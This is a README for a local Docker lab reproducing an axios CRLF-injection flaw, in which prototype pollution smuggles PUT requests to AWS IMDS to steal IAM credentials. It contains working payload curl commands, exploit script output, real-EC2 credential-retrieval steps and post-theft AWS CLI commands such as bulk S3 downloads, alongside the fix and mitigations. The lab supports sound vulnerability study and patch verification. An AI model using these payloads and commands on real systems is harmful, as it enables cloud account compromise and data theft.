# CVE-2026-40175 Local Reproduction Lab

> **Disclaimer**: This lab is for technical article writing and educational purposes only. Do not run it outside of your own managed local environment.

---

## Overview

| Item | Content |
| ------ | ------ |
| Vulnerability | Prototype pollution escalated to RCE / full cloud compromise via gadget attack chain |
| CVE | [CVE-2026-40175](https://www.cvedetails.com/vulnerability-list/vendor_id-19831/product_id-54129/year-2026/opec-1/Axios-Axios.html) |
| CVSS | 10.0 (Critical) |
| EPSS | 0.24% |
| Publication Date | 2026-04-10 |
| Vulnerable Versions | axios < 1.15.0 |
| Prototype Pollution Reproduction | Vulnerable deepMerge (for...in) allows `__proto__` key to pass through |

### Attack Chain

```text
[Attacker]
    │
    │ 1. {"__proto__": {"x-inject": "dummy\r\n\r\nPUT /latest/api/token..."}}
    │    Embed in POST body
    ▼
[SSR Server / Node.js Backend]
    │   Vulnerable deepMerge (using for...in) merges body
    │   → Object.prototype["x-inject"] gets polluted
    │   (lodash < 4.17.17 / jQuery < 3.4.0 had similar implementations)
    │
    │ 2. Request to internal API
    │   → Implementation collecting headers with for...in picks up polluted value
    │   → HTTP request splits due to \r\n\r\n (HTTP Request Splitting)
    ▼
[AWS IMDS / Internal Service]
    │   PUT /latest/api/token gets smuggled
    │   → IMDSv2 token gets issued
    ▼
[Attacker]
    Steals IAM credentials (AccessKey, SecretKey, SessionToken)
```

### Why Can't It Be Attacked Directly from the Browser?

The browser environment has three layers of defense that block CRLF injection.

```text
[Browser]
    1. axios browser version (XHR adapter)
       → Uses Object.keys() to process headers, ignores prototype pollution
    2. XMLHttpRequest specification
       → Rejects values containing \r\n in setRequestHeader()
    3. Browser network layer
       → Filters header values before sending
```

**The real danger is server-side axios** (SSR, microservices, Lambda, etc.).

---

## What Attackers Target — AWS IMDS and Credential Theft

The ultimate goal of this attack is to steal **AWS IAM temporary credentials (AccessKeyId / SecretAccessKey / SessionToken)**. With these, the attacker can operate AWS account resources from outside the EC2 instance.

---

### What is AWS IMDS?

IMDS (Instance Metadata Service) is an internal endpoint provided by AWS for EC2 instances to retrieve their own information (IAM credentials, instance ID, region, etc.).

```text
┌─────────────────────────────────────────────────────────┐
│  Inside EC2 Instance                                     │
│                                                         │
│  App → GET 169.254.169.254 → Returns IAM Credentials     │
│           ^^^^^^^^^^^^^^^^                              │
│           Link-local address                            │
│           Not routable from outside EC2 (unreachable)    │
└─────────────────────────────────────────────────────────┘
```

| Characteristic | Content |
| ------ | ------ |
| IP Address | `169.254.169.254` (link-local) |
| Access Range | Reachable only from within that EC2 instance |
| Enabled State | **Enabled by default**. Always open unless disabled |
| Reality in Production | Most production EC2 instances have IAM roles attached and can retrieve credentials |

---

### IMDSv1 vs IMDSv2 — Evolution of SSRF Protection

AWS introduced IMDSv2 in 2019 as a countermeasure against SSRF (Server-Side Request Forgery).

```text
IMDSv1 (Old Method): Immediate credential retrieval with GET only
───────────────────────────────────────────────────────
  GET http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole
  → Credentials returned directly (stealable with one SSRF)

IMDSv2 (New Method): Requires token acquisition with PUT
───────────────────────────────────────────────────────
  Step1: PUT http://169.254.169.254/latest/api/token
         X-aws-ec2-metadata-token-ttl-seconds: 21600
         → Session token returned

  Step2: GET http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole
         X-aws-ec2-metadata-token: <Step1 token>
         → Credentials returned
```

**Why IMDSv2 is an SSRF countermeasure:**

IMDSv2's Step 1 requires PUT method. Additionally, IMDS has a TTL=1 hop limit and **does not follow redirects**.

This combination prevents typical SSRF scenarios like:

- Vulnerabilities that just forward `?url=` parameters to other services (via redirect)
- SSRF-to-redirect type attacks (methods that redirect to IMDS)

However, it's not that "SSRF can only send GET" — depending on server implementation, POST/PUT can be sent. IMDSv2 is not a silver bullet that prevents all SSRF, but one defense layer against typical SSRF scenarios.

---

### Why This CVE Breaks Through IMDSv2

Using CRLF injection (HTTP Request Splitting), you can "smuggle" a PUT request inside a GET request.

```text
Payload sent by attacker (looks like normal JSON body):
  {"__proto__": {"x-inject": "dummy\r\n\r\nPUT /latest/api/token HTTP/1.1\r\n..."}}
                                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                              Smuggled request separated by CRLF

TCP stream actually sent by SSR server to internal API (IMDS):
  GET /api/healthcheck HTTP/1.1\r\n    ← Normal request
  Host: 169.254.169.254\r\n
  x-inject: dummy\r\n
  \r\n                                 ← Request 1 ends here
  PUT /latest/api/token HTTP/1.1\r\n  ← Smuggled request!
  Host: 169.254.169.254\r\n
  X-aws-ec2-metadata-token-ttl-seconds: 21600\r\n
  \r\n

IMDS interprets as two requests:
  [1] GET /api/healthcheck  (harmless)
  [2] PUT /latest/api/token (IMDSv2 token issuance!)
```

---

### What Gets Stolen — IAM Temporary Credentials

Once the IMDSv2 token is obtained, you get the following response (structure of fake data returned by this lab's `mock-imds/server.js`):

```json
{
  "Code": "Success",
  "LastUpdated": "2026-04-11T00:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA_FAKE_ACCESS_KEY_ID",
  "SecretAccessKey": "FAKE/SECRET/ACCESS/KEY/FOR/DEMO",
  "Token": "FAKE_SESSION_TOKEN_DEMO_ONLY",
  "Expiration": "2026-04-12T00:00:00Z"
}
```

| Field | Role |
| ----------- | ------ |
| `AccessKeyId` | Key ID used for AWS API signing (starts with `ASIA` for temporary keys) |
| `SecretAccessKey` | Secret key used for generating API request signatures |
| `Token` | Session token indicating temporary credentials (required) |
| `Expiration` | Expiration date (usually 1-6 hours; re-acquisition needed after expiry) |

**Try actually retrieving using curl in this lab:**

```bash
# Terminal 1: Monitor mock-imds logs (confirm hits)
docker logs -f mock-imds

# Terminal 2: Step1 — Acquire IMDSv2 token
TOKEN=$(curl -s -X PUT "http://localhost:8080/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
echo "Acquired token: ${TOKEN}"
# → FAKE-IMDS-TOKEN-AAABBBCCC111222

# Step2 — Retrieve IAM credentials
curl -s "http://localhost:8080/latest/meta-data/iam/security-credentials/MyRole" \
  -H "X-aws-ec2-metadata-token: ${TOKEN}" | jq .
```

**Expected output:**

```json
{
  "Code": "Success",
  "LastUpdated": "2026-04-11T00:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA_FAKE_ACCESS_KEY_ID",
  "SecretAccessKey": "FAKE/SECRET/ACCESS/KEY/FOR/DEMO",
  "Token": "FAKE_SESSION_TOKEN_DEMO_ONLY",
  "Expiration": "2026-04-12T00:00:00Z"
}
```

**When accessing without token (confirm IMDSv2 defense):**

```bash
# Without X-aws-ec2-metadata-token header → 401 Unauthorized
curl -v "http://localhost:8080/latest/meta-data/iam/security-credentials/MyRole"
# → HTTP/1.1 401 Unauthorized
```

### Reference: Operations within actual AWS EC2 instance (outside lab)

#### Prerequisites (IMDS access won't work without these)

| Condition | Content | Verification Method |
| ------ | ------ | --------- |
| Running on EC2 instance | 169.254.169.254 is link-local address not routable from outside EC2 | Check if `curl -s --max-time 2 http://169.254.169.254/latest/meta-data/` responds |
| IMDS enabled | Enabled by default. Check `http_endpoint = "enabled"` in console or Terraform | If above curl doesn't timeout, it's enabled |
| IAM role attached to EC2 | If instance profile not set, credential endpoint returns empty | Check AWS Console → EC2 → Instance → IAM role field |
| PUT required if IMDSv2 enforced | `hop_limit=1` blocks redirect-based attacks. TTL usually 21600 seconds (6 hours) | If only IMDSv1 enabled, GET works without PUT |

#### Operation Steps and Expected Responses

```bash
# Step 1: Acquire IMDSv2 session token
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
echo "Token: ${TOKEN}"
# Expected: Long Base64-like string returned
# Example: AQAEAHr9... (hundreds of characters)
# Empty string → IMDSv2 not configured or running outside EC2

# Step 2: Get attached IAM role name
ROLE=$(curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  -H "X-aws-ec2-metadata-token: ${TOKEN}")
echo "Role: ${ROLE}"
# Expected: IAM role name returned as plain text (not JSON)
# Example: itg-bastion-role
# Empty string → Instance profile not configured

# Step 3: Retrieve IAM temporary credentials
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE}" \
  -H "X-aws-ec2-metadata-token: ${TOKEN}"
# Expected: JSON like below returned
```

**Expected response for Step 3 (on success):**

```json
{
  "Code": "Success",
  "LastUpdated": "2026-04-12T08:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "AQoDYXdzEJr...(long session token)",
  "Expiration": "2026-04-12T14:00:00Z"
}
```

| Field | Interpretation |
| ----------- | ------ |
| `Code: "Success"` | Proof that credential retrieval completed normally |
| `AccessKeyId` | Starts with `ASIA` → Temporary key (type issued by AssumeRole) |
| `Expiration` | Usually 1-6 hours later. Auto-rotated after expiry |
| `Token` | Required. Without this, AWS API calls result in `InvalidClientTokenId` error |

**What this response means in the context of the attack:**

```text
If the attacker obtains these 3 values (AccessKeyId / SecretAccessKey / Token),
they can fully exercise the IAM role's permissions from outside EC2 using AWS CLI / SDK.

export AWS_ACCESS_KEY_ID="ASIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/..."
export AWS_SESSION_TOKEN="AQoDYXdzEJr..."

aws s3 ls   ← Executing from outside EC2, but passes with IAM role permissions
```

---

### What can be done when credentials are stolen

With all 3 values, the attacker can **from outside EC2** fully exercise all permissions of that IAM role.

```bash
# Operations from attacker's PC (outside EC2)
export AWS_ACCESS_KEY_ID="ASIA_FAKE_ACCESS_KEY_ID"
export AWS_SECRET_ACCESS_KEY="FAKE/SECRET/ACCESS/KEY/FOR/DEMO"
export AWS_SESSION_TOKEN="FAKE_SESSION_TOKEN_DEMO_ONLY"

# Depending on IAM role permissions, the following become possible
aws s3 ls                                     # List S3 buckets
aws s3 cp s3://prod-bucket/ . --recursive     # Bulk download production data
aws ec2 describe-instances                    # Understand infrastructure configuration
aws secretsmanager list-secrets               # List Secrets Manager
aws iam list-users                            # List IAM users (prepare for lateral movement)
```

**Chain of impact:**

```text
IAM credential theft
    ↓
S3 data leakage (customer data, confidential documents)
    ↓
Obtain connection info to RDS/DynamoDB (via Secrets Manager)
    ↓
Lateral movement to other EC2/Lambda
    ↓
Full acquisition of API keys, DB passwords, external service credentials
    ↓
Complete compromise of entire AWS account
```

The impact scope depends on the attached IAM role's permissions, but actual applications often have broad permissions like "S3 Full Access" or "RDS Full Access", leading to significant data breaches.

> **Correspondence with this lab**: `mock-imds/server.js` reproduces this IMDS behavior.  
> You can observe in real-time when the attack hits and fake credentials are issued with `docker logs -f mock-imds`.

---

## Directory Structure

```text
axios-vuln-1.5.0/
├── docker-compose.yml
├── README.md
│
├── mock-imds/          # Fake AWS metadata server (replacement for 169.254.169.254)
│   ├── Dockerfile
│   └── server.js       # Issues IMDSv2 tokens and returns IAM credentials
│
├── victim/             # Attack script execution environment
│   ├── Dockerfile
│   ├── package.json    # axios@1.14.0 (vulnerable version)
│   ├── exploit.js      # Reproduces prototype pollution + net.Socket attack
│   ├── safe.js         # Verifies axios CRLF validation layer (v1.14.0=vulnerable, v1.15.0=fixed)
│   └── test.js         # Automated tests using node:test (run with npm test)
│
└── ssr-app/            # Vulnerable Node.js backend (attack target)
    ├── Dockerfile
    ├── package.json    # axios@1.14.0 (vulnerable version)
    └── server.js       # Express server with vulnerable/safe endpoints
```

---

## Startup Method

```bash
# Build
docker compose build

# Start all services
docker compose up -d

# Monitor logs (confirm attack reception)
docker logs -f mock-imds
```

| Service | URL | Purpose |
| --------- | ----- | ------ |
| mock-imds | <http://localhost:8080> | Fake AWS metadata server (attack impact point) |
| ssr-app | <http://localhost:4000/api/profile> | Vulnerable endpoint (attack target) |

---

## Demo Procedure

The attack target is the Node.js server (ssr-app) API endpoint. Hit it directly with curl.

### Scenario A: Execute attack with curl (success)

**Start log monitoring in Terminal 1:**

```bash
docker logs -f mock-imds
```

**Execute attack in Terminal 2:**

```bash
# POST prototype pollution payload (this is the only attacker operation)
curl -s -X POST http://localhost:4000/api/profile \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"x-inject": "dummy\r\n\r\nPUT /latest/api/token HTTP/1.1\r\nHost: mock-imds\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\n\r\n"}}' \
  | jq '{prototypePolluted, leakedHeaders, rawRequestSent}'
```

**Confirm in Terminal 2 response:**

```json
{
  "prototypePolluted": true,
  "leakedHeaders": [
    { "key": "x-inject", "value": "dummy\r\n\r\nPUT /latest/api/token..." }
  ],
  "rawRequestSent": "GET /api/healthcheck HTTP/1.1\r\nHost: mock-imds\r\nx-inject: dummy\r\n\r\nPUT /latest/api/token HTTP/1.1\r\n..."
}
```

**Confirm in Terminal 1 (mock-imds logs):**

```text
[IMDS] GET /api/healthcheck           ← Normal request
[IMDS] PUT /latest/api/token          ← Smuggled request!
[IMDS] ⚠️  IMDSv2 token issuance request detected! TTL=21600
[IMDS] 🔑  Returning fake token...
[IMDS] GET /latest/meta-data/iam/security-credentials/MyRole
[IMDS] 🚨 IAM credentials have been stolen!
```

If `PUT /latest/api/token` arrives, the attack succeeded.

---

### Scenario B: Compare with defense version

```bash
# Endpoint using safeDeepMerge (Object.keys() + __proto__ skip)
curl -s -X POST http://localhost:4000/safe/profile \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"x-inject": "dummy\r\n\r\nPUT /latest/api/token..."}}' \
  | jq '{prototypePolluted}'
```

**Expected result:**

```json
{ "prototypePolluted": false }
```

`PUT /latest/api/token` does not arrive in Terminal 1 (mock-imds).

---

### Scenario C: Direct reproduction with Node.js script

```bash
# exploit.js: Smuggle CRLF with net.Socket (attack reproduction)
docker compose run --rm victim node exploit.js

# safe.js: Pass CRLF header directly to axios to verify validation
# → CRLF passes through in axios@1.14.0 (default) (vulnerable)
docker compose run --rm victim node safe.js
```

`exploit.js` bypasses axios CRLF validation by sending raw TCP directly with `net.Socket` without using axios.

`safe.js` uses a custom adapter to verify only axios's header validation layer without actual HTTP communication. Results change depending on installed version. In axios@1.14.0, CRLF passes through to adapter; in axios@1.15.0, `assertValidHeaderValue` throws error before adapter call.

> **Point**: `safe.js` verification directly tests axios CRLF validation. Since it doesn't go through Node.js http module, axios's own differences are clear regardless of Node.js version.

---

## Technical Background

### Why the "prototype pollution → CRLF" path works

JavaScript's `for...in` enumerates not only the object's own properties, but also **properties on the prototype chain**.

```javascript
// Attacker pollutes prototype
Object.prototype['x-inject'] = 'dummy\r\n\r\nPUT /latest/api/token HTTP/1.1\r\n...';

// "Normal" code written by developer (vulnerable implementation)
const headers = {};
for (const key in headers) {        // ← x-inject leaks here
  requestHeaders[key] = headers[key];
}
```

### Prototype pollution in vulnerable deepMerge

Implementations that merge objects with `for...in` don't specially handle `__proto__` key, allowing `Object.prototype` pollution from user input.

```javascript
// JSON body sent by attacker
{ "__proto__": { "x-inject": "dummy\r\n\r\nPUT /latest/api/token..." } }

// When merged with vulnerable deepMerge (using for...in)
// → Object.prototype["x-inject"] = "dummy\r\n..." gets set

// Safe implementation (Object.keys() + __proto__ skip)
for (const key of Object.keys(source)) {
  if (key === '__proto__') continue;  // ← This alone prevents it
  ...
}
```

lodash < 4.17.17 / jQuery < 3.4.0 / many custom merge functions had similar issues.

### Two conditions for attack success

This attack **only succeeds when both conditions overlap with AND**. If only one, the attack stops.

```text
Condition ① Server-side code has for...in
       ↓
       If Object.prototype['x-inject'] = 'dummy\r\n...' is polluted,
       for...in picks it up and mixes into headers passed to axios

Condition ② axios v1.14.0 does not validate CRLF
       ↓
       Does not reject \r\n in mixed values and sends as-is in HTTP
```

| Condition | Content | Whose problem |
| ------ | ------ | ------------ |
| ① Using `for...in` to build headers | Picks up prototype-polluted values | Server-side code |
| ② axios does not validate CRLF | Passes through even if value contains `\r\n` | axios v1.14.0 |

Attack stops even with only one countermeasure:

```text
Block only ① (don't use for...in)
  → Polluted values don't reach axios → Attack fails

Block only ② (upgrade axios to 1.15.0+)
  → axios immediately errors on CRLF-containing values → Attack fails
```

However, implementing both countermeasures is the correct approach.

---

### Actual vulnerable location in axios v1.14.0: `normalizeValue` regex

axios itself uses `Object.keys()` in `utils.forEach`, no `for...in` internally.

The problem is in the regex of `normalizeValue` function in `AxiosHeaders.js`:

```javascript
// normalizeValue in v1.14.0 (before fix)
function normalizeValue(value) {
  if (value === false || value == null) {
    return value;
  }
  return utils.isArray(value)
    ? value.map(normalizeValue)
    : String(value).replace(/[\r\n]+$/, '');  // ← Only removes trailing
    //                             ↑ $ present, so intermediate \r\n passes through
}
```

```text
Input:   "dummy\r\nPUT /latest/api/token HTTP/1.1\r\n..."
Only trailing \r\n removed →
Output:  "dummy\r\nPUT /latest/api/token HTTP/1.1\r\n..."
          ↑ Intermediate \r\n remains → HTTP Request Splitting succeeds
```

---

### What the fixed version (axios@1.15.0) prevents

`assertValidHeaderValue` was added in PR [#10660](https://github.com/axios/axios/pull/10660). Immediately errors if **even one** `\r` or `\n` is present.

```javascript
// Validation added in v1.15.0 (after fix)
const isValidHeaderValue = (value) => !/[\r\n]/.test(value);
//                                          ↑ No $ → detects anywhere

function assertValidHeaderValue(value, header) {
  if (value === false || value == null) return;
  if (!isValidHeaderValue(String(value))) {
    throw new Error(`Invalid character in header content ["${header}"]`);
  }
}

// Called on all paths that set headers
self[key || _header] = normalizeValue(_value);  // ← assertValidHeaderValue runs before this
```

```javascript
// Behavior in axios@1.15.0
axios.get(url, {
  headers: { 'x-inject': 'dummy\r\nX-injected: value' }
});
// → Error: Invalid character in header content ["x-inject"]
```

---

### Defense comparison: App-side vs axios-side

| Countermeasure | Implementation Location | Mechanism | Is CVE fix |
| ---- | ------- | ------ | ---------- |
| `safeDeepMerge` (`Object.keys()` + `__proto__` skip) | Application | Prevents prototype pollution, ensures polluted values don't reach axios | × App-side countermeasure |
| axios@1.15.0 (`assertValidHeaderValue`) | axios library | Immediately errors on header values containing `\r\n` | ✓ CVE fix |

Scenario B can be blocked thanks to app-side `safeDeepMerge`. Since `Object.keys()` doesn't traverse prototype chain, polluted values don't reach axios.

The essential fix for CVE is axios@1.15.0's **CRLF validation**. Even if `for...in` remains in app-side code, axios@1.15.0+ will error immediately when trying to set `\r\n`-containing values in headers. Conversely, if only `safeDeepMerge` is implemented but axios remains old, attacks could succeed if prototype pollution occurs via another path.

---

## Cleanup

```bash
docker compose down --volumes --rmi all
```

---

## Attack Experience Walkthrough

Complete step-by-step guide to experience "what happens in what order" from scratch. **All operations are completed with curl.**

### Step 0: Start the environment

```bash
# Build & start all services
docker compose up -d --build

# Confirm startup (wait until all 3 containers are Running)
docker compose ps
```

| Container | Port | Role |
| --------- | ------- | ------ |
| mock-imds | localhost:8080 | Fake AWS metadata server (attack target) |
| ssr-app | localhost:4000 | Vulnerable Node.js backend (attack target) |
| victim | none | For running Node.js scripts |

```bash
# Terminal 1: Monitor mock-imds logs in real-time
docker logs -f mock-imds
```

---

### Step 1: Execute the attack (main scenario)

**Execute in Terminal 2:**

```bash
curl -s -X POST http://localhost:4000/api/profile \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"x-inject": "dummy\r\n\r\nPUT /latest/api/token HTTP/1.1\r\nHost: mock-imds\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\n\r\n"}}' \
  | jq '{prototypePolluted, leakedHeaders, rawRequestSent}'
```

**Attack chain breakdown (happens automatically inside server):**

```text
Attacker's curl: POST /api/profile
  Body: {"__proto__": {"x-inject": "dummy\r\n\r\nPUT /latest/api/token..."}}
                        ↓
[1] JSON.parse → __proto__ remains as own property
[2] vulnerableDeepMerge (for...in) → Object.prototype["x-inject"] polluted
[3] sendToInternalAPI's for...in → x-inject leaks into headers
[4] net.Socket raw TCP send → request splits on \r\n\r\n
                        ↓
mock-imds: Receives PUT /latest/api/token → Issues IMDSv2 token
```

**Terminal 1 (mock-imds logs):**

```text
[IMDS] GET /api/healthcheck           ← Normal request
[IMDS] PUT /latest/api/token          ← Smuggled request!
[IMDS] ⚠️  IMDSv2 token issuance request detected! TTL=21600
[IMDS] 🔑 Returning fake token...
[IMDS] GET /latest/meta-data/iam/security-credentials/MyRole
[IMDS] 🚨 IAM credentials stolen!
```

---

### Step 2: Compare with the fixed version

```bash
curl -s -X POST http://localhost:4000/safe/profile \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"x-inject": "dummy\r\n\r\nPUT /latest/api/token..."}}' \
  | jq '{prototypePolluted, mergeFunction}'
```

**Expected result:**

```json
{
  "prototypePolluted": false,
  "mergeFunction": "safeDeepMerge (Object.keys() + __proto__ skip)"
}
```

`PUT /latest/api/token` won't reach Terminal 1. Since `Object.keys()` ignores `__proto__` key, pollution doesn't occur.

---

### Step 3: Directly verify CVE with Node.js scripts

**Confirm axios@1.14.0 is vulnerable:**

```bash
# exploit.js: Smuggle CRLF with net.Socket (attack reproduction)
docker compose run --rm victim node exploit.js
```

**Expected output:**

```text
[1] Polluted Object.prototype["x-inject"]
    Value: CRLF + smuggled request (PUT /latest/api/token)

[2] Verifying prototype pollution propagation...
    ⚠️  Leaked from prototype: x-inject = "dummy\r\n\r\nPUT /latest/api/token HTTP/1.1\r\nHo...

[3] Simulating normal Axios request (bypassing with net.Socket)...
[3] Socket connection complete. Sending polluted HTTP request...

[4] mock-imds response (1st):
    HTTP/1.1 200 OK

[5] Attack result:
    ✅ Attack successful! Smuggled request (PUT /latest/api/token) reached mock-imds
    → IMDSv2 token was issued (check mock-imds logs)
```

```bash
# safe.js: Pass CRLF headers directly to axios to check validation
# → In axios@1.14.0, CRLF passes through (vulnerable)
docker compose run --rm victim node safe.js
```

**Expected output (axios@1.14.0 = vulnerable):**

```text
=== CVE-2026-40175 Verification (axios@1.14.0) ===

[3] ★ CVE Verification: Pass CRLF-containing headers directly to axios...

    ⚠️  [axios@1.14.0] CRLF reached adapter without validation!
    Header value that was about to be sent:
    "dummy\r\n\r\nPUT /latest/api/token HTTP/1.1\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600"

    → This version is vulnerable to CVE-2026-40175.
```

**Upgrade to axios@1.15.0 and confirm the fix:**

```bash
# Replace with axios@1.15.0 inside container and run same test
docker compose run --rm victim sh -c "npm install axios@1.15.0 && node safe.js"
```

**Expected output (axios@1.15.0 = fixed):**

```text
=== CVE-2026-40175 Verification (axios@1.15.0) ===

[3] ★ CVE Verification: Pass CRLF-containing headers directly to axios...

    ✅ [axios@1.15.0] Blocked: Invalid character in header content ["x-inject"]
    → assertValidHeaderValue detected CRLF and threw error before reaching adapter!
    → Fixed for CVE-2026-40175.
```

**The `Invalid character in header content` error proves that axios@1.15.0's fix is working correctly.**

---

### Step 4: Observe the attack at packet level

```bash
# Terminal 1: Capture TCP packets
docker compose exec mock-imds tcpdump -A -i eth0 port 80

# Terminal 2: Execute Step 1 curl
```

You can see multiple HTTP requests packed into one TCP packet:

```text
GET /api/healthcheck HTTP/1.1
Host: mock-imds
x-inject: dummy

PUT /latest/api/token HTTP/1.1        ← Smuggled separate request
Host: mock-imds
X-aws-ec2-metadata-token-ttl-seconds: 21600

GET /latest/meta-data/iam/security-credentials/MyRole HTTP/1.1
Host: mock-imds
```

This is the reality of HTTP Request Splitting. The server thinks it sent one request, but the receiver interprets it as three requests.

---

### Summary: What we learned

| Verification Item | Result |
| --------- | ------ |
| Send `__proto__` payload to vulnerable endpoint with curl | Attack succeeds・IMDSv2 token issued |
| Send `__proto__` payload to safe endpoint with curl | Blocked (`__proto__` pollution defense) |
| `express.text()` + `JSON.parse` + `for...in` merge | Prototype pollution passes through |
| `express.json()` + `safeDeepMerge` (`Object.keys()`) | Prototype pollution blocked |
| Run `safe.js` with axios@1.14.0 (pass CRLF directly) | Passes through without error → **vulnerable** |
| Run `safe.js` with axios@1.15.0 (pass CRLF directly) | `Invalid character in header content` → **fixed** |

**Essential lessons:**

- **Don't build headers with `for...in`** — It picks up prototype-polluted values
- **`__proto__` blocking alone is not enough defense against CVE-2026-40175** — axios-side CRLF validation is required
- **axios@1.15.0 update is necessary** — `assertValidHeaderValue` immediately errors on values containing `\r\n`
- To "verify" CVE fix, confirm that `Invalid character in header content` error occurs
